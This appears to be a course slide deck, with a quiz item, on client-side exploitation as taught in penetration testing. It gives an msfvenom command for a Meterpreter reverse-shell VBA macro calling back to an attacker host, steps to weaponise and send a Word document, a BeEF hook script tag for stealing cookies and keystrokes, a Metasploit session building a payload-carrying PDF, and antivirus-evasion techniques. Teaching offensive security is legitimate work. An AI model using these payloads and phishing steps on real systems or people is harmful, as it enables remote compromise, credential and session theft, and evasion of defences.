title: Client-Side Exploitation 🖥️
description: Trick users into running malicious code.

slides.title: Attacking the User, Not the Server 👤
slides.content:
# Bypassing the Firewall

Firewalls block inbound connections to servers. But they **allow outbound connections** from users' workstations.

**Client-Side Exploitation** involves tricking a user into:
- Opening a malicious **document** (Word, PDF).
- Visiting a malicious **website**.
- Plugging in a malicious **USB drive**.

**Result**: The user's computer connects **outbound** to you, bypassing the firewall entirely.

slides.title: Malicious Office Macros 📎
slides.content:
# The Classic Phishing Attachment

Microsoft Office allows **VBA Macros**—scripts that automate tasks. They can also download and execute malware.

**Weaponizing a Word Document with Metasploit:**
1.  Generate a Macro payload:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f vba
    ```
2.  Copy the generated VBA code.
3.  Create a Word document, insert a Macro, paste the code.
4.  Save as `.docm` (Macro-Enabled Document).
5.  Set up a listener in Metasploit (`exploit/multi/handler`).
6.  Send the document to the target.

**Evasion Tip**: Modern Office blocks macros by default. You need **Social Engineering** to convince the user to click 'Enable Content'.

quizData.question: Why are client-side attacks effective against firewalled targets?

options.text: They exploit the web server directly.
The victim's machine initiates the outbound connection, bypassing inbound firewall rules.
They use UDP instead of TCP.

quizData.explanation: Outbound connections are typically allowed, so the payload calls home to the attacker.

slides.title: Browser Exploitation (BeEF) 🐄
slides.content:
# Hooking the Browser

**BeEF (Browser Exploitation Framework)** is a tool that focuses on exploiting the web browser itself.

**How it Works:**
1.  You inject a **JavaScript hook** into a website the victim visits (via XSS or phishing).
2.  The hooked browser reports back to your BeEF server.
3.  You can now launch modules to:
    - Fingerprint the browser/OS.
    - Steal cookies (Session Hijacking).
    - Keylogging.
    - Social Engineering popups (Fake Flash Update).

**Starting BeEF:**
```bash
sudo beef-xss
# Then browse to http://127.0.0.1:3000/ui/panel
```

**The Hook Script:** `<script src="http://[Your_IP]:3000/hook.js"></script>`

slides.title: Generating a Malicious PDF 📄
slides.content: Using Metasploit to embed a payload into a PDF.
slides.codeSnippet:
msf6 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
msf6 exploit(adobe_pdf_embedded_exe) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.56.102
msf6 exploit(adobe_pdf_embedded_exe) > set FILENAME report.pdf
msf6 exploit(adobe_pdf_embedded_exe) > exploit

[*] Creating report.pdf...
[+] report.pdf stored at /root/.msf4/local/report.pdf
```

This creates a PDF that, when opened with a vulnerable Adobe Reader, executes the payload.

slides.title: Antivirus Detection 🛡️
slides.content:
## Standard Payloads Will Be Caught

If you generate a payload with `msfvenom` using default settings, Windows Defender **will detect and quarantine it** immediately.

**Bypass Techniques (Covered in later chapters):**
- **Encoders** (`-e x86/shikata_ga_nai`).
- **Custom Templates**.
- **Veil-Evasion** framework.
- **Obfuscation**.
